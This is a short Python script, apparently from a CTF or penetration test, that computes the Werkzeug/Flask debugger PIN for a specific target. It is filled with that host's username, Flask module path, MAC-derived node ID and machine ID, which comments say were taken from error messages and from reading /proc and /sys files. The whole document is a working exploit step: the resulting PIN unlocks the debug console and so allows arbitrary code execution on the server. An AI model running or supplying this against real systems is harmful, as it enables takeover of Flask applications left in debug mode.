import hashlib

###################################################################### SYS INFO

USER_NAME = b"root" # guess
MOD_NAME = b"flask.app"
APP_NAME = b"Flask"
MOD_FILE = b"/usr/local/lib/python3.10/site-packages/flask/app.py" # error messages
NODE_UUID = str(int("02:42:ac:11:00:05".replace(":", ""), 16)).encode("utf-8") # /sys/class/net/eth0/address
MACHINE_ID = b"e29cc293-141b-4b90-9a60-33e4778efb0f0663947348df4cb724008312143170307ab432336141b39163ab17bf8947b54e" # /proc/sys/kernel/random/boot_id + /proc/self/cgroup

def hash_pin(pin: str) -> str:
    return hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]

def generate_pin(username, modname, appname, modfile, nodeuuid, machineid) -> str:

    h = hashlib.sha1()
    for bits in [username, modname, appname, modfile, nodeuuid, machineid]:
        h.update(bits)
    h.update(b"cookiesalt")

    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

    return "-".join(
        num[x : x + 3].rjust(3, "0")
        for x in range(0, len(num), 3))

print(generate_pin(
    username=USER_NAME,
    modname=MOD_NAME,
    appname=APP_NAME,
    modfile=MOD_FILE,
    nodeuuid=NODE_UUID,
    machineid=MACHINE_ID))
